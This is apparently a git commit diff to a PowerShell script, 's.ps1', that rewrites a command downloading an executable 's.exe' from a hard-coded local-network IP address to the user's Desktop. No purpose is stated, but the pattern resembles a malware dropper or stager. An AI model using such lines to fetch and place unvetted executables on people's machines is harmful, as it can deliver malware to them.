7eda183541f5e6afb759821c34a7757e70c6db5f
guilegel4 <guilegel4@mail.com>
2025-02-05 18:23:37 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,2 +1,1 @@
-$httpClient = New-Object System.Net.Http.HttpClient
-$httpClient.GetAsync("http://192.168.43.228:5005/s.exe").Result.Content.ReadAsByteArrayAsync().Result | Set-Content "$env:USERPROFILE\Desktop\s.exe" -Encoding Byte
+Invoke-WebRequest -Uri "http://192.168.43.228:5005/s.exe" -OutFile "$env:USERPROFILE\Desktop\s.exe"
